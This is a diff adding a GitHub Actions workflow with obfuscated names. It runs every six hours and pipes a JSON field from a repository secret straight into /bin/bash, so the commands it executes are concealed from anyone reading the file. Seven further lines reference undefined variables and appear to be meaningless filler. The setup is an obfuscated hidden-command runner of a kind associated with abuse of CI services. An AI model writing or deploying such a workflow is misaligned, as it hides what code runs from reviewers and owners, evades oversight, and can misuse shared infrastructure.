@@ -1,0 +1,25 @@
+name: jiangjing19871010
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiangjing19871010
+        env:
+          emqpq01400: ${{ secrets.emqpq01400 }}
+        run: |
+          echo $emqpq01400 | jq -r .t867 | /bin/bash
+          echo $rwfx8349 | jq -r .vf367 | /bin/bash
+          echo $zftj244 | jq -r .xk3 | /bin/bash
+          echo $zf15 | jq -r .qy310 | /bin/bash
+          echo $fu792 | jq -r .vp4714 | /bin/bash
+          echo $sr45 | jq -r .g5 | /bin/bash
+          echo $kpf3 | jq -r .mfgp0744 | /bin/bash
+          echo $pfdo39122 | jq -r .p3 | /bin/bash
+
